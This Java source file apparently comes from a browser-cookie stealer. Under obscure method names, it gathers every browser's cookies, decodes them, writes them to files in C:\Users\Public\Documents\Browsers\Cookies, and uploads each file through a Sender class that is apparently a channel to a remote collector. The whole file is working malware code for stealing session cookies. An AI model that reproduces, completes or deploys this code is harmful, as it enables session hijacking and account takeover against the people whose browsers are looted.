package io.github.luxotick.impl.cookies;

import io.github.luxotick.Sender;
import io.github.luxotick.utils.util;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Base64;
import java.util.Map;

import static io.github.luxotick.Start.documents;

public class sendCookies {
    public static void mh() throws Exception {
        OkHttpClient client = new OkHttpClient();

        File folder = new File("C:\\Users\\Public\\Documents\\Browsers\\Cookies");

        for (File file : folder.listFiles()) {
            if (file.isFile()) {

                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                        .build();

                Sender.sendFile(client, requestBody);
            }
        }
    }
    public static void zaa() {
        Map<String, String> browserCookies = util.getAllBrowserCookies();

        for (Map.Entry<String, String> entry : browserCookies.entrySet()) {
            String A = documents + "/Browsers/Cookies/";
            String browserFolder = A + entry.getKey() + ".txt";
            String encodedCookieData = entry.getValue();
            byte[] cookieData = Base64.getDecoder().decode(encodedCookieData);

            // Write the cookie data to a text file
            writeCookieToFile(browserFolder, new String(cookieData));
        }
    }


    public static void writeCookieToFile(String fileName, String cookieData) {
        try {
            File file = new File(fileName);
            file.getParentFile().mkdirs();
            BufferedWriter writer = new BufferedWriter(new FileWriter(file));
            writer.write(cookieData);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
